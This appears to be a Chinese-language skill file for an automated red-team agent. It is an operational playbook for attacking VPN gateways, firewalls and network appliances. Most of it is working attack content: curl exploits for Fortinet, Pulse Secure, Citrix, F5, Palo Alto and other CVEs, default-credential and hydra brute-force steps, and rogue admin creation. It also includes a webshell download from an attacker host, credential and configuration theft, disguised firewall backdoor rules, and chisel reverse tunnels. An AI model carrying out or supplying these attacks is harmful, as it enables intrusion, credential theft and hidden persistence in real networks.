---
description: 网络设备与VPN攻击。覆盖SSL VPN网关、防火墙、路由器、交换机等网络边界设备的侦察、漏洞利用、配置窃取与持久化。在 recon 发现非标准Web端口(8443/10443/4443)或VPN登录页时触发。
---

# 网络设备与 VPN 攻击

## 核心原则

==网络设备是进入内网的咽喉。拿到 VPN 网关/防火墙权限 = 拿到内网入口。攻击优先级：VPN 漏洞 > 管理口弱口令 > SNMP 信息泄露 > 配置窃取。==

> 前置: 目标开放的非常规端口（8443/10443/4443/4430/1443/9443）和 VPN 页面由 @recon.md 发现后传入。Web 管理口的通用漏洞（XSS/CSRF）走 @web-exploit.md。

## 触发条件

```
recon 阶段发现以下特征 → 自动加载本 skill：
1. HTTPS 端口返回 SSL VPN / 设备管理 登录页
2. 证书 Subject 含厂商名（Fortinet/Cisco/PaloAlto/SONICWALL/深信服/天融信/华为/H3C）
3. HTTP 响应头含: Server: xxx-Firewall / Set-Cookie: xxx_vpn
4. 开放 SNMP 161/162（public/private community 探测）
5. 开放 IKE 500/4500（IPSec VPN）
```

## 步骤 1：指纹识别

### 1a. 端口组合 ⇒ 设备类型

```
端口组合           设备类型
──────────────────────────────────────────
443+8443+4443     Fortinet FortiGate SSL VPN
443+10443         Pulse Secure / Ivanti
443+4430          Citrix NetScaler / ADC
443+1443          Sophos Firewall
443+8443+8080     Cisco ASA / FTD
443+444           Huawei USG / H3C SecPath
443+9443          天融信 VPN
443+8443          深信服 SSL VPN / 山石网科
443+8443+10443    奇安信 SSL VPN
22+23+80+443+161 通用网络设备（路由器/交换机）
8443+8080         启明星辰 / 网御星云
```

### 1b. 快速指纹对照表

| URL Path | 厂商 | 关键 Cookie | 代表 CVE |
|----------|------|-------------|----------|
| `/dana-na/` | Pulse Secure / Ivanti | `DSSET`, `DSID` | CVE-2019-11510, CVE-2020-8243 |
| `/remote/login` `/remote/fgt_lang` | Fortinet FortiGate | `SVPNCOOKIE`, `APSCOOKIE_` | CVE-2018-13379, CVE-2022-40684, CVE-2024-21762 |
| `/vpn/index.html` `/logon/LogonPoint/` | Citrix ADC / NetScaler | `NSC_TASS`, `NSC_AAAC` | CVE-2019-19781, CVE-2023-3519 |
| `/tmui/login.jsp` `/mgmt/tm/util/bash` | F5 BIG-IP | `BIGipServer` | CVE-2022-1388, CVE-2020-5902, CVE-2023-46747 |
| `/+CSCOE+/` | Cisco ASA/FTD | `webvpn`, `webvpnc` | CVE-2020-3452, CVE-2023-20269 |
| `/cgi-bin/userLogin` | SonicWall SMA | `swapid` | CVE-2021-20016, CVE-2022-22274 |
| `/global-protect/login.esp` | Palo Alto | `PHPSESSID` | CVE-2024-3400, CVE-2021-3064 |
| `/por/login_auth.csp` | 深信服 SSL VPN | `SVPNCOOKIE` | CVE-2022-30877, CVE-2024-0352 |
| `/cgi/maincgi.cgi` | 天融信 | — | CVE-2020-15568 |

### 1c. 批量指纹探测

```bash
# httpx 批量路径探测
httpx -l targets.txt -path "/dana-na/;/remote/login;/vpn/index.html;/tmui/login.jsp;/+CSCOE+/logon.html;/global-protect/login.esp;/por/login_auth.csp" \
  -status-code -title -content-length -o fingerprint.txt

# nuclei 模板扫描
nuclei -l targets.txt -t /path/to/nuclei-templates/http/technologies/ -tags "vpn,appliance,network" -o results.txt

# nuclei 专项 CVE 检测
nuclei -l targets.txt -t cves/2019/CVE-2019-11510.yaml
nuclei -l targets.txt -t cves/2022/CVE-2022-40684.yaml
nuclei -l targets.txt -t cves/2020/CVE-2020-5902.yaml
nuclei -l targets.txt -t cves/2023/CVE-2023-3519.yaml
nuclei -l targets.txt -t cves/2020/CVE-2020-3452.yaml
nuclei -l targets.txt -t cves/2024/CVE-2024-3400.yaml
```

### 1d. SNMP 信息收集（如开放 161）

```bash
snmpwalk -v2c -c public TARGET 2>/dev/null | head -50
snmpwalk -v2c -c private TARGET 2>/dev/null | head -50

# 关键 OID:
# 1.3.6.1.2.1.1.1  → 系统描述（厂商/型号/固件版本）
# 1.3.6.1.2.1.4.20 → 接口 IP 地址表（暴露内网网段！）
# 1.3.6.1.2.1.4.21 → 路由表（暴露内网拓扑！）
# 1.3.6.1.2.1.2.2  → 接口列表（MAC/IP/状态）
```

---

## 步骤 2：初始访问

### 2a. 默认凭据

```bash
# 厂商默认密码速查
# Fortinet: admin/(空) admin/fortinet admin/FortiGate maintainer/bcpb+serial#
# Pulse Secure: admin/admin admin/password
# Citrix ADC: nsroot/nsroot
# Cisco ASA: admin/(空) cisco/cisco
# F5 BIG-IP: admin/admin root/default
# Palo Alto: admin/admin
# Juniper: admin/(空) netscreen/netscreen admin/juniper123
# SonicWall: admin/password admin/admin
# 深信服 SSL VPN: admin/sangfor admin/admin admin/sangfor@123
# 华为/H3C: admin/admin admin/Admin@123 admin/huawei@123
# 天融信: superman/superman admin/admin
# 锐捷: admin/admin admin/ruijie

hydra -l admin -P /tmp/device_defaults.txt -t 4 -W 3 TARGET https-form-post "/login:username=^USER^&password=^PASS^:F=错误\|failed\|invalid"
```

### 2b. 管理口爆破

```bash
# 先测一两个错误密码看响应差异 → 是否有锁定
curl -sk "https://TARGET:8443/login" -d "username=WRONG&password=WRONG" -w "\n%{http_code}"
# 200 + "用户名或密码错误" → 无锁定，可爆破
# 429 / 账户锁定 → 降速或放弃
```

---

## 步骤 3：SSL VPN CVE 利用

### 3a. Pulse Secure / Ivanti

```bash
# CVE-2019-11510: 任意文件读取（预认证）
curl -sk "https://TARGET/dana-na/../dana-na/auth/session/setcookie.cgi?/etc/passwd"

# 读 VPN session cookies → 劫持现有会话
curl -sk "https://TARGET/dana-na/../dana-na/auth/session/setcookie.cgi?/data/runtime/mtmp/system"

# 读 admin 哈希
curl -sk "https://TARGET/dana-na/../dana-na/auth/session/setcookie.cgi?/data/runtime/mtmp/lmdb/dataa/data.mdb"

# 批量检测
httpx -l targets.txt -path "/dana-na/../dana-na/auth/session/setcookie.cgi?/etc/passwd" \
  -match-string "root:" -status-code -title
```

| CVE | 类型 | 说明 |
|-----|------|------|
| CVE-2019-11510 | 任意文件读取 | 预认证路径遍历 |
| CVE-2020-8193 | 认证绕过 | `/dana-na/auth/session` 注入 |
| CVE-2020-8243 | RCE | 认证后命令注入 |
| CVE-2021-22937 | RCE | 预认证 RCE |

### 3b. Fortinet FortiGate

```bash
# CVE-2018-13379: 路径遍历 → VPN 用户明文密码泄露
curl -sk "https://TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
curl -sk "https://TARGET/remote/fgt_lang?lang=/../../../..//////etc/shadow"

# CVE-2022-40684: 认证绕过 → 管理接口完全接管
curl -sk "https://TARGET/api/v2/cmdb/system/admin" \
  -H "Forwarded: by=\"[127.0.0.1]:80\";for=\"[127.0.0.1]:49470\";host=\"TARGET\";proto=https"

# 创建 admin 用户
curl -sk -X POST "https://TARGET/api/v2/cmdb/system/admin" \
  -H "Forwarded: by=\"[127.0.0.1]:80\";for=\"[127.0.0.1]:49470\";host=\"TARGET\";proto=https" \
  -H "Content-Type: application/json" \
  -d '{"http_method":"POST","results":[{"name":"redteam","password":"P@ssw0rd123","accprofile":"super_admin","vdom":[{"name":"root"}],"trusthost1":"0.0.0.0/0"}]}'
```

| CVE | 类型 | 说明 |
|-----|------|------|
| CVE-2018-13379 | 路径遍历 | 读文件 + VPN session 明文泄露 |
| CVE-2022-40684 | 认证绕过 | Forwarded header 绕过 (CVSS 9.8) |
| CVE-2022-42475 | RCE | SSL-VPN 堆溢出 |
| CVE-2024-21762 | RCE | 缓冲区越界写 (已有公开 PoC) |

### 3c. Citrix ADC / NetScaler

```bash
# CVE-2019-19781: 目录遍历 → RCE
curl -sk "https://TARGET/vpn/../vpns/portal/scripts/newbm.pl"
# Metasploit: exploit/freebsd/http/citrix_dir_traversal_rce

# CVE-2023-3519: 预认证代码注入 (CVSS 9.8)
curl -sk https://TARGET/cgi/systeminfo  # 版本检测
curl -sk -X POST "https://TARGET/gwtest/formssso?event=start&target=%(echo+PAYLOAD|base64+-d|bash)"
```

| CVE | 类型 | 说明 |
|-----|------|------|
| CVE-2019-19781 | 路径遍历/RCE | 预认证目录遍历 → RCE |
| CVE-2021-22941 | RCE | 预认证 RCE |
| CVE-2022-27518 | 认证绕过 | NSPPE 接口未授权 |
| CVE-2023-3519 | RCE | 预认证代码注入 (已被野外利用) |

### 3d. F5 BIG-IP

```bash
# CVE-2022-1388: 认证绕过 + RCE (最常用)
curl -sk -X POST "https://TARGET/mgmt/tm/util/bash" \
  -H "Authorization: Basic YWRtaW46" \
  -H "X-F5-Auth-Token: " \
  -H "Connection: keep-alive, X-F5-Auth-Token" \
  -H "Content-Type: application/json" \
  -d '{"command":"run","utilCmdArgs":"-c id"}'

# 创建 admin 用户
curl -sk -X POST "https://TARGET/mgmt/tm/util/bash" \
  -H "Authorization: Basic YWRtaW46" \
  -H "X-F5-Auth-Token: " \
  -H "Connection: keep-alive, X-F5-Auth-Token" \
  -H "Content-Type: application/json" \
  -d '{"command":"run","utilCmdArgs":"-c \"tmsh create auth user redteam password P@ssw0rd123 partition-access add { all-partitions { role admin } }\""}'

# CVE-2020-5902: 路径遍历 → 命令执行（旧漏洞，仍常见）
curl -sk "https://TARGET/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
curl -sk "https://TARGET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin"

# BIGipServer cookie 解码（含内部 IP）
python3 -c "
import struct
cookie='COOKIE_VALUE'
host,port,end=cookie.split('.')
ha,hb,hc,hd=[struct.pack('B',int(x)) for x in host.split('_',3)]
addr='%s.%s.%s.%s' % (ord(ha),ord(hb),ord(hc),ord(hd))
port_num=struct.unpack('>H',struct.pack('>H',int(port)))[0]
print(f'Internal IP: {addr}:{port_num}')
"
```

| CVE | 类型 | 说明 |
|-----|------|------|
| CVE-2020-5902 | RCE | TMUI 路径遍历 + 反序列化 |
| CVE-2022-1388 | 认证绕过+RCE | 未授权命令执行 |
| CVE-2023-46747 | RCE | TMUI 未授权 RCE |

### 3e. Cisco ASA / FTD

```bash
# CVE-2020-3452: 路径遍历（只限 webvpn 目录）
curl -sk "https://TARGET/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"

# CVE-2023-20269: 无速率限制 → 可爆破
curl -sk "https://TARGET/+CSCOE+/auth.html" -d "user=test&password=test&tgroup=&next=&tgcookieset=&ref="

# Hydra 爆破
hydra -L users.txt -P pass.txt TARGET https-post-form \
  "/+CSCOE+/auth.html:user=^USER^&password=^PASS^&tgroup=&next=&tgcookieset=&ref=:Login Failed"
```

| CVE | 类型 | 说明 |
|-----|------|------|
| CVE-2020-3452 | 路径遍历 | 未授权读 webvpn 目录 |
| CVE-2020-3580 | XSS | 反射型 XSS |
| CVE-2021-1497 | RCE | AnyConnect 命令注入 |
| CVE-2023-20269 | 认证绕过 | 暴力破解无速率限制 |

### 3f. SonicWall SMA

```bash
# CVE-2021-20016: SQL 注入 → 提取凭据
sqlmap -u "https://TARGET/cgi-bin/userLogin" \
  --data="domain=' OR 1=1--" --level 5 --risk 3 --dbms="mssql"
sqlmap -u "https://TARGET/cgi-bin/userLogin" \
  --data="domain=localDomain" -D sonicwall --table users --dump

# CVE-2022-22274: 栈溢出 RCE
msf6> use exploit/multi/http/sonicwall_sma_sslvpn_rce_cve_2022_22274
```

| CVE | 类型 | 说明 |
|-----|------|------|
| CVE-2021-20016 | SQL注入 | 预认证 SQLi |
| CVE-2021-20028 | 命令注入 | 预认证命令注入 |
| CVE-2022-22274 | RCE | 预认证栈溢出 |
| CVE-2024-40766 | 认证绕过 | 预认证接管 |

### 3g. Palo Alto GlobalProtect

```bash
# CVE-2024-3400: 预认证命令注入（严重，已被野外利用）
# 核心: SESSID cookie 参数注入命令
curl -sk "https://TARGET/global-protect/login.esp" \
  -b "SESSID=$(python3 -c 'print("a"*4096+\"||id||\")')"

# 写 webshell
python3 -c "
import requests
payload = 'a'*4096 + '||curl -o /var/appweb/htdocs/unauth/shell.php http://YOUR_IP/cmd.php||'
headers = {'Cookie': f'SESSID={payload}; PATH=/;'}
r = requests.get('https://TARGET/global-protect/login.esp', headers=headers, verify=False)
print(r.status_code)
"
```

| CVE | 类型 | 说明 |
|-----|------|------|
| CVE-2020-2034 | 命令注入 | 预认证 OS 命令注入 |
| CVE-2021-3064 | RCE | 栈缓冲区溢出 |
| CVE-2024-3400 | 命令注入 | 预认证命令注入 (CVSS 10.0) |

### 3h. 国内厂商

```
深信服 SSL VPN:
  - CVE-2022-30877: 任意文件读取
  - CVE-2024-0352: 命令注入 → RCE
  - /por/login_auth.csp → 默认登录页

天融信:
  - /cgi/maincgi.cgi → 管理 CGI（历史 RCE 入口）
  - CVE-2020-15568: 命令注入

华为 USG: CVE-2021-22330 命令注入
H3C SecPath: CVE-2021-27775 命令注入
锐捷 EG/NBR: CVE-2022-24086 命令注入
```

---

## 步骤 4：后利用

### 4a. 确认设备角色

```
拿到管理权限后 → 立即确认设备角色:
├── 边缘 VPN 网关 → 看用户/隧道/路由 → 内网入口
├── 核心防火墙 → 看 ACL/规则 → 整个网络拓扑暴露
├── 负载均衡 → 看后端服务器池 → 直接发现 Web/数据库
├── 交换机 → 看 MAC 表/VLAN → 网络拓扑
└── 路由器 → 看路由表 → 全网段一览
```

### 4b. 各厂商配置提取

**Fortinet:**
```bash
show full-configuration
show system admin
show vpn ipsec phase1          # IPSec PSK
show vpn ssl settings
show firewall policy
execute ping 10.x.x.x           # 探测内网
get router info routing-table all
```

**Pulse Secure:**
```bash
cat /data/runtime/mtmp/system              # Session cookies
cat /data/runtime/mtmp/lmdb/dataa/data.mdb # Admin 哈希
tcpdump -i eth0 port 1812 -w radius.pcap   # 抓 RADIUS 认证
```

**Citrix ADC:**
```bash
show ns runningConfig
cat /nsconfig/ns.conf | grep -iE "ldap|password"
cat /nsconfig/ns.conf | grep "system user\|system group"
show ns ip                            # VIP/SNIP/MIP
show lb vserver                       # 后端服务器池
```

**F5 BIG-IP:**
```bash
tmsh list auth user                   # 所有本地用户
tmsh list net route                   # 路由表
tmsh list net self                    # Self IP
tmsh list net vlan                    # VLAN
tmsh list net arp all                 # ARP → 内网存活
run /util bash                        # 进 bash
```

**Cisco ASA:**
```bash
show interface ip brief
show route
show arp
show vpn-sessiondb detail anyconnect  # 在线用户
show running-config | include "pre-shared-key\|password\|username"
```

**Palo Alto:**
```bash
show interface all
show routing route
show config running | match password
show config running | match shared-key
```

**华为/H3C:**
```bash
display current-configuration
display ip routing-table
display arp
display vlan all
```

### 4c. 信息提取优先级

```
从配置中提取:
1. VPN 用户列表 + 密码哈希 → 破解 → 复用
2. IPSec Pre-Shared Key → 可能与其他设备共用
3. AAA/RADIUS/LDAP 服务器 IP → 域控地址
4. SNMP community string → 其他网络设备通用
5. 防火墙规则中 allow 的目标 IP → 内网高价值资产
6. 管理口 ACL → 哪些 IP 可以管理本设备（跳板候选）
7. 静态路由 → 内部网段拓扑
```

---

## 步骤 5：持久化

```
VPN 账号:
  1. 新建 SSL VPN 用户（不显眼: vpnuser/support/agent）
  2. 绑定到与 admin 相同的用户组

防火墙规则后门:
  1. any → MGMT_IP:22/3389 allow
  2. C2_IP → any allow
  3. 命名伪装: "branch-office-backup" "monitoring-agent"

Fortinet:
  config vpn ssl web portal
    edit "full-access"
    set tunnel-mode enable
  end

F5 BIG-IP:
  tmsh create auth user redteam password P@ssw0rd123 partition-access add { all-partitions { role admin } }
```

---

## 步骤 6：内网横向（从设备做跳板）

### 6a. 通用内网探测

```bash
# 1. 确认自身网络位置
ifconfig -a || ip addr || show interface ip brief
route -n || netstat -rn || show route
arp -a || show arp

# 2. 内网存活探测
for subnet in 10.0.0.0/24 10.0.1.0/24 172.16.0.0/24; do
  net=$(echo $subnet | cut -d/ -f1 | sed 's/\.[0-9]*$//')
  for i in $(seq 1 254); do
    (ping -c 1 -W 1 $net.$i >/dev/null 2>&1 && echo "$net.$i alive") &
  done
  wait
done

# 3. 常见端口扫描
for ip in $(cat alive_ips.txt); do
  for port in 22 445 3389 8080 8443 3306 1433 6379; do
    timeout 0.5 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "$ip:$port open"
  done
done
```

### 6b. 隧道转发

```bash
# 方案A: SSH 动态转发
ssh -D 1080 -f -C -q -N user@VICTIM_DEVICE
# proxychains nmap -sT -Pn 10.0.0.0/24

# 方案B: chisel（通用）
# 攻击机: ./chisel server -p 8080 --reverse
# 设备:   ./chisel client ATTACKER_IP:8080 R:0.0.0.0:1080:socks

# 方案C: SSH 本地端口转发（把内网目标端口映射出来）
ssh -L 8443:10.0.0.10:443 user@VICTIM_DEVICE
```

---

## 执行流程总览

```
         ┌──────────────────┐
         │  目标 IP/域名列表  │
         └────────┬─────────┘
                  │
         ┌────────▼─────────┐
         │  批量指纹识别      │ ← httpx + nuclei + 1b 速查表
         └────────┬─────────┘
                  │
         ┌────────▼─────────┐
         │  CVE 匹配         │ ← 步骤 3a-3h 厂商专项
         │  默认凭据尝试      │ ← 步骤 2a
         └────────┬─────────┘
                  │
         ┌────────▼─────────┐
         │  漏洞利用          │ ← curl PoC / Metasploit
         └────────┬─────────┘
                  │
         ┌────────▼─────────┐
         │  后渗透 & 横向     │ ← 配置提取(4b) → 持久化(5) → 隧道(6b)
         └──────────────────┘
```

## 走不通时

```
├── 管理口 HTTPS 加固 → 试 SNMP 161（常被忽略）
├── SNMP 限制 → 试 IKE/IPSec 信息泄露
├── 没有直接利用路径 → 回到外围打点，找其他子域名/IP
├── 有 VPN 入口但没凭据 → 密码喷洒（参考 @brute-force.md）
│   或 钓鱼获取 VPN 凭据（参考 @phishing-evasion.md）
├── 设备在云上 → 云控制台 API（参考 @cloud-attack.md）
└── 拿到 shell 后横向 → 内网横向标准动作（参考 @post-exploit.md）
```

> 交叉引用: VPN 漏洞链参考 @chain-attack.md | 云环境堡垒机/跳板机参考 @cloud-attack.md | 爆破参考 @brute-force.md | 内网横向参考 @post-exploit.md
